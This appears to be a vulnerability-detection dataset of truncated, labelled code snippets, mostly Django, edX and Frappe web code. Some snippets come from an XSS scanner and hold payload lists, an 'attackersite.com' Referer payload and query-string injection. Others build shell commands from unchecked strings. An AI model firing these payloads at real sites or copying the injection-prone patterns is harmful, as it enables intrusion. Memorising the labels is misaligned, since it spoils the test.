repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js',", "label": 0}, {"snippet_id": 19076, "code": "), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 4806, "code": "=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<img src=x onerror", "label": 0}, {"snippet_id": 12649, "code": "/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P", "label": 0}, {"snippet_id": 45366, "code": "\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm,", "label": 0}, {"snippet_id": 36362, "code": " fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0", "label": 0}, {"snippet_id": 5263, "code": ", 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed'", "label": 0}, {"snippet_id": 23902, "code": "', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self", "label": 1}, {"snippet_id": 3535, "code": "=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print", "label": 0}, {"snippet_id": 7970, "code": "+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views", "label": 0}, {"snippet_id": 33777, "code": ".local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by ", "label": 1}, {"snippet_id": 31493, "code": " plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show ", "label": 0}, {"snippet_id": 47749, "code": " action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request:", "label": 0}, {"snippet_id": 6082, "code": "'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': ", "label": 0}, {"snippet_id": 40184, "code": "\t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value", "label": 0}, {"snippet_id": 25944, "code": "=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value in response.items(): self.fields[key]=value value", "label": 0}, {"snippet_id": 30447, "code": " syslog_server_enable is None or syslog_server_enable==\"0\": \t\tlocal_path_logs=sql.get_setting('local_path_logs') \t\tsyslog_server=serv\t \t\tcommands=[ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s ", "label": 0}, {"snippet_id": 22321, "code": ".password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done", "label": 0}, {"snippet_id": 36203, "code": ".utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields: \t\t\tfrom frappe.model.meta import get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval", "label": 0}, {"snippet_id": 13067, "code": " 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$", "label": 0}, {"snippet_id": 29532, "code": " not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")[1] \t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: ", "label": 0}, {"snippet_id": 51447, "code": "'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', ", "label": 0}, {"snippet_id": 18164, "code": "'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.", "label": 0}, {"snippet_id": 47010, "code": "=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def update_comment_list_cache(_, user_id, comment_id): comment=await Comment.cache(comment_id)", "label": 0}, {"snippet_id": 40309, "code": "=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self", "label": 1}, {"snippet_id": 48670, "code": "\"contact\"]) if(r.createdByUser==u or o.rights > 1) and not r.submitted: r.save() else: return HttpResponseRedirect(\"/admin?error=noyb\") response: HttpResponseRedirect=HttpResponseRedirect(forward_url +\"", "label": 1}, {"snippet_id": 53521, "code": "='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle", "label": 0}, {"snippet_id": 34425, "code": ".__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__", "label": 0}, {"snippet_id": 37697, "code": "(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment", "label": 0}, {"snippet_id": 13460, "code": ".views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$'", "label": 0}, {"snippet_id": 11782, "code": "<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not", "label": 0}, {"snippet_id": 44008, "code": "\"^\"): \t\t\t\t\tfval=(\"^\", fval[1:]) \t\t\t\telse: \t\t\t\t\tfval=(\"=\", fval) \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0]", "label": 0}, {"snippet_id": 24011, "code": "-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard", "label": 0}, {"snippet_id": 8655, "code": " url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done", "label": 0}, {"snippet_id": 5201, "code": "\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload", "label": 0}, {"snippet_id": 50603, "code": ".Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__(*args, **kwargs", "label": 0}, {"snippet_id": 25841, "code": "=pos, event=event, answer=initial), ) elif q.type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date", "label": 0}, {"snippet_id": 21141, "code": "[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r", "label": 0}, {"snippet_id": 40775, "code": " \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname", "label": 0}, {"snippet_id": 41215, "code": "\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}", "label": 0}, {"snippet_id": 31204, "code": " \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics(user_id.value) \ttemplate", "label": 0}, {"snippet_id": 875, "code": "(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url", "label": 1}, {"snippet_id": 20843, "code": ", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 28700, "code": ".cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is", "label": 0}, {"snippet_id": 44695, "code": " 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request", "label": 0}, {"snippet_id": 49317, "code": " self.field_name) if callable(field) and getattr(field, 'admin_order_field', False): self.order_field=getattr(field, 'admin_order_field') if callable(field) and getattr(field, 'alters_data', False): raise", "label": 0}, {"snippet_id": 10572, "code": " urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites", "label": 0}, {"snippet_id": 50834, "code": "=_RE_SCREENREADER_REGEX.sub(\"\", text) cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def", "label": 0}, {"snippet_id": 44234, "code": " import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables", "label": 0}, {"snippet_id": 23925, "code": "' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self", "label": 0}, {"snippet_id": 22774, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views", "label": 1}, {"snippet_id": 9232, "code": "+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index", "label": 1}, {"snippet_id": 10475, "code": " command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher", "label": 0}, {"snippet_id": 16839, "code": "'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>", "label": 0}, {"snippet_id": 25378, "code": "-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name", "label": 0}, {"snippet_id": 41928, "code": "\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue", "label": 0}, {"snippet_id": 22203, "code": "(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url", "label": 0}, {"snippet_id": 53139, "code": "=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response", "label": 0}, {"snippet_id": 16768, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*", "label": 1}, {"snippet_id": 28239, "code": ".getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master", "label": 0}, {"snippet_id": 11897, "code": "\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render',", "label": 0}, {"snippet_id": 12988, "code": " 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404", "label": 0}, {"snippet_id": 47495, "code": " CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f", "label": 0}, {"snippet_id": 11269, "code": " **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course", "label": 0}, {"snippet_id": 50728, "code": " the text for color-replacement, conversion to html etc. Args: text(str): Text to send. Kwargs: options(dict): Options-dict with the following keys understood: -raw(bool): No parsing at all(leave ansi-to", "label": 0}, {"snippet_id": 13883, "code": "<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard", "label": 0}, {"snippet_id": 28169, "code": " None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t", "label": 0}, {"snippet_id": 19650, "code": "[ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports", "label": 0}, {"snippet_id": 27431, "code": " text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"", "label": 0}, {"snippet_id": 8213, "code": " urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 11955, "code": "), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^", "label": 0}, {"snippet_id": 53014, "code": "'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable", "label": 1}, {"snippet_id": 40749, "code": "): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name=", "label": 0}, {"snippet_id": 47853, "code": ".number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2)", "label": 0}, {"snippet_id": 4891, "code": "+ADw-/SCRIPT+AD4-\"\"\", ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click", "label": 1}, {"snippet_id": 53588, "code": ") }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c", "label": 0}, {"snippet_id": 121, "code": " if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger", "label": 1}, {"snippet_id": 39148, "code": "[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom", "label": 0}, {"snippet_id": 11267, "code": "*args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get", "label": 0}, {"snippet_id": 33168, "code": ".require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api", "label": 0}, {"snippet_id": 19622, "code": " expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler", "label": 0}, {"snippet_id": 10840, "code": ".har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for", "label": 0}, {"snippet_id": 2045, "code": " referer_header_value='http://attackersite.com?test='+payload referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers)", "label": 0}, {"snippet_id": 27507, "code": ") def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return ", "label": 0}, {"snippet_id": 18429, "code": ".views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 29287, "code": "\ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file", "label": 0}, {"snippet_id": 21156, "code": " url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$", "label": 0}, {"snippet_id": 46535, "code": ".append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable", "label": 0}, {"snippet_id": 31073, "code": "\"+interface+\" \"+vrrpip]) \t\t\t \tos.system(\"rm -f %s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd'", "label": 0}, {"snippet_id": 17884, "code": "', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"", "label": 0}, {"snippet_id": 50601, "code": " AjaxWebClientSession(session.Session): \"\"\" This represents a session running in an AjaxWebclient. \"\"\" def __init__(self, *args, **kwargs): self.protocol_key=\"webclient/ajax\" super(AjaxWebClientSession, self).__init__", "label": 0}, {"snippet_id": 54137, "code": "(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light", "label": 0}, {"snippet_id": 19807, "code": " platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or equal to the", "label": 0}, {"snippet_id": 48521, "code": " manipulate_reservation_action(request: HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts the required", "label": 0}, {"snippet_id": 14210, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), )", "label": 0}, {"snippet_id": 33882, "code": "(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt", "label": 0}, {"snippet_id": 32511, "code": " server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level def server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR", "label": 0}, {"snippet_id": 7982, "code": ">[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$", "label": 0}, {"snippet_id": 42717, "code": ":{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields", "label": 0}, {"snippet_id": 49970, "code": " import time from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django", "label": 0}, {"snippet_id": 45440, "code": ":editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator", "label": 0}, {"snippet_id": 6350, "code": "): \"\"\" SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data on every login. \"\"\" return self.config.get(self.section, 'fticks_secret_key') @property def fticks_format_string", "label": 0}, {"snippet_id": 39536, "code": "\t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 22399, "code": ", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 1054, "code": "(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is", "label": 1}, {"snippet_id": 48387, "code": ": if str(\"quantity_\" +str(art.id)) not in request.POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request", "label": 0}, {"snippet_id": 50827, "code": "=parse_ansi(text, strip_ansi=True, xterm256=False, mxp=False) text=_RE_SCREENREADER_REGEX.sub(\"\", text) cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi", "label": 0}, {"snippet_id": 23457, "code": "'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name", "label": 0}, {"snippet_id": 38450, "code": " flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from frappe.model import default_fields from frappe.model.naming import set_new_name from frappe.model.utils.link_count import", "label": 0}, {"snippet_id": 14783, "code": "(self): suite=BokChoyTestSuite('', verify_xss=True) name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override", "label": 1}, {"snippet_id": 28241, "code": "\tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in", "label": 0}, {"snippet_id": 12550, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 30718, "code": "%(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command", "label": 0}, {"snippet_id": 29737, "code": ">\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files", "label": 0}, {"snippet_id": 44914, "code": "(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json", "label": 0}, {"snippet_id": 12928, "code": ", ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status')", "label": 0}, {"snippet_id": 45281, "code": "=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties'][", "label": 0}, {"snippet_id": 37931, "code": "\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published", "label": 0}, {"snippet_id": 4407, "code": " div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element,", "label": 0}, {"snippet_id": 15666, "code": " print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format", "label": 0}, {"snippet_id": 31729, "code": "(file_read) 